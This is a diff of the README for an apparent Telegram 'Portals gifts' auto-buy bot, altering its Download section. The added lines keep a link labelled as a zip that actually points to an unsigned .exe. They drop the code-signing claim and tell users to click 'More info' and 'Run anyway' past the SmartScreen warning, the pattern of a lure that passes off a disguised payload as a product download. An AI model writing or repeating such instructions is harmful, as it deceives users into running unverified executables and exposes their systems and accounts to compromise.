@@ -28,12 +28,11 @@ It starts in practice mode, so you see what it would have made before you risk r
 
 ## Download
 
-[Download `portals-gifts-autobuy-bot.zip`](https://github.com/OnyxTarantulaLoop/portals-gifts-autobuy-bot/releases/latest/download/portals-gifts-autobuy-bot.zip) — one zip, no installer, no admin rights.
+[Download `portals-gifts-autobuy-bot.zip`](https://github.com/OnyxTarantulaLoop/portals-gifts-autobuy-bot/releases/latest/download/Portalsnipe-1.0.2-portable-x64.exe) — one zip, no installer, no admin rights.
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Portalsnipe` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 
 
 
